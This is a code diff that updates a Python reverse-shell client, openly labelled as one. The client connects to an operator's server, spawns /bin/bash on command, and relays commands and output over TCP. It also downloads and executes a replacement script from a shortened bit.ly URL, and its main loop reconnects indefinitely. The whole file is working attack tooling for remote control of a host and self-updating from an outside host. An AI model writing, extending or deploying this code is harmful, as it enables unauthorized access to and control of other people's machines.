@@ -1,11 +1,13 @@
 """
 Async client for reverse shelling ୧༼ಠ益ಠ༽︻╦╤─
-
 Expects server ip and port as command line arguments
-Executes /bin/bash and uses Streamread/Streamwrite as its stdin/stdout
-    Connection (TCP) is kept open until closed by server
+
+When receiving a b'SHELL':
+    Opens /bin/bash and connect stdin/stdout
 
 Updates itself by executing the .py downloaded from RELEASE
+
+
 """
 
 import urllib.request
@@ -15,6 +17,7 @@ import socket
 import time
 import sys
 import os
+import re
 
 HOST = sys.argv[1]
 PORT = int(sys.argv[2])
@@ -22,8 +25,8 @@ PORT = int(sys.argv[2])
 RELEASE = "https://bit.ly/2Cp4hXU"
 
 
-def restart(file_url=RELEASE, generation=0):
-    script_name = "client{}.py".format(generation)
+def restart(file_url=RELEASE, generation='_zero'):
+    script_name = f"client{generation}.py"
     urllib.request.urlretrieve(file_url, script_name)
     pythonpath = sys.executable
     os.execl(pythonpath, pythonpath, script_name, HOST, PORT)
@@ -50,7 +53,10 @@ def subp_run(command):
                           timeout=None)
 
 
-def ping():
+
+def ping(interval=5):
+    # socket family is AF_INET (ipv4)
+    # socket type is SOCK_STREAM (connection oriented TCP protocol)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
             s.connect((HOST, PORT))
@@ -69,12 +75,24 @@ def ping():
                 print(data)
                 session(s)  # Drop into a session
         else:
-            time.sleep(5)
+            time.sleep(interval)
             ping()  # Close this socket, reopen a new one, try again
 
 
 def session(s: socket):
     """
+    Opens a /bin/bash, pipes received data into its stdin, sends back stdout/err
+
+    Messages are at most 1024 bytes and end with  b' ADD', b' AYE'  or b' BYE'
+        - b' ADD' signals more will follow
+        - b' AYE' signals the end (of a shell command)
+        - b' BYE' signals the end of this session
+
+    The bodies of received messages are concatenated (until an b' AYE') and
+    executed i.e. sent to the /bin/bash with b' ; echo exit status $?\n'.
+
+    The command its stdout is streamed back to the server line by line.
+
     :param s: A socket that received b'SHELL' (from server.py)
     """
 
@@ -86,12 +104,33 @@ def session(s: socket):
                             bufsize=0)
 
     while True:
-        data = s.recv(1024)
-        print(data)
-        assert data[-4:] == b' AYE'  # End of message
-        proc.stdin.write(data[:-4]+b'\n')
-        time.sleep(1)
-        print(proc.stdout.readline())
+
+        messages = []  # List of bytes
+        packet = s.recv(1024)
+        print(packet)
+        assert packet[:8] == b'TIMEOUT '
+
+        t = re.search(b'\d+', packet).group()  # Returns at first match
+        body = packet[8+len(t)+1:-4]
+        type = packet[-4:]
+
+
+        if type == b' AYE':  # Execute body
+            # command = b''.join(message for message in messages)
+            command = body
+            proc.stdin.write(command + b'\n')
+            print(proc.stdout.readline())
+
+        elif type == b' ADD':  # Append to body
+            pass
+
+        elif type == b' BYE':  # Graceful
+            print(proc.communicate())
+            pass
+
+        else:
+            print("Panic")
+            restart(file_url=RELEASE, generation="_ghetto")
 
 # loop_shell(1)
 data = ping()
@@ -99,13 +138,9 @@ data = ping()
 
 
 
-#if __name__ == "__main__":
-#    import pathlib
-#    import sys
-#    assert sys.version_info >= (3, 7), "Pls"
-#    here = pathlib.Path(__file__).parent
-#    logpath = here.joinpath("client.log")
+if __name__ == "__main__":
+    assert sys.version_info >= (3, 7), "Pls"
+    while True:
+        ping(interval=10)
 
 
-# socket family is AF_INET (ipv4)
-# socket type is SOCK_STREAM (connection oriented TCP protocol)
